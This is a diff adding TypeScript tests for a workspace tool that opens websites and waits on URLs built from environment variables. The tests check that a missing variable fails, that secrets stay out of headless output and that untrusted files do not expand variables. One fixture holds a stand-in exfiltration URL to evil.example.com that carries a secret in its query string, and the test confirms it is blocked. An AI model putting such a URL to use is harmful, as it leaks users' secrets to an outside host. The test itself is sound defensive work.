@@ -214,6 +214,51 @@ describe("switchToWorkspace", () => {
     expect(platform.calls[4]).toContain("press enter to close");
   });
 
+  it("opens a website made from the environment, and fails the step when the variable isn't set", async () => {
+    const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "{{env.WISP_TEST_SHOP}}/admin" }] }] });
+    const platform = recorder();
+    process.env["WISP_TEST_SHOP"] = "https://shop.example.com";
+    try {
+      const opened = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
+      expect(opened.targets[0]).toMatchObject({ ok: true, value: "{{env.WISP_TEST_SHOP}}/admin" });
+      expect(platform.calls).toEqual(["url https://shop.example.com/admin"]);
+    } finally {
+      delete process.env["WISP_TEST_SHOP"];
+    }
+    const missing = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
+    expect(missing.targets[0]).toMatchObject({ ok: false, error: expect.stringContaining("$WISP_TEST_SHOP isn't set here") });
+    expect(platform.calls).toHaveLength(1);
+    process.env["WISP_TEST_SHOP"] = "https://shop.example.com";
+    try {
+      const headless = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: server, defaults: {} });
+      expect(headless.targets[0]).toMatchObject({ ok: true, value: "{{env.WISP_TEST_SHOP}}/admin", note: "no display: open it yourself, from $WISP_TEST_SHOP" });
+      expect(JSON.stringify(headless.targets)).not.toContain("shop.example.com");
+    } finally {
+      delete process.env["WISP_TEST_SHOP"];
+    }
+  });
+
+  it("does not open a website made from the environment in a file nobody trusted", async () => {
+    const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "https://evil.example.com/?k={{env.WISP_TEST_SECRET}}" }, { url: "acme.com" }] }] }, "/work/acme/.wisp.json", false);
+    const platform = recorder();
+    process.env["WISP_TEST_SECRET"] = "hunter2";
+    try {
+      await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
+    } finally {
+      delete process.env["WISP_TEST_SECRET"];
+    }
+    expect(platform.calls).toEqual(["url https://acme.com/"]);
+  });
+
+  it("skips a wait that reads the environment in a file nobody trusted, and runs it once trusted", async () => {
+    const main = { pipelines: [{ label: "go", inputs: { website: { default: "acme.com" } }, steps: [{ wait: { url: "{{env.WISP_TEST_HEALTH}}", timeout: 1 } }, { wait: { url: "{{website}}", timeout: 1 } }] }] };
+    const plan = (ws: Workspace) => planPipeline(ws, resolvePipeline(ws, "go"));
+    const untrusted = await plan(workspace(main, "/work/acme/.wisp.json", false));
+    expect(untrusted.map((step) => step.target.value)).toEqual(["{{website}}"]);
+    const trusted = await plan(workspace(main));
+    expect(trusted.map((step) => step.target.value)).toEqual(["{{env.WISP_TEST_HEALTH}}", "{{website}}"]);
+  });
+
   it("prints links and skips windows when there is no display", async () => {
     const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "acme.com" }, { app: "Slack" }] }] });
     const platform = recorder();
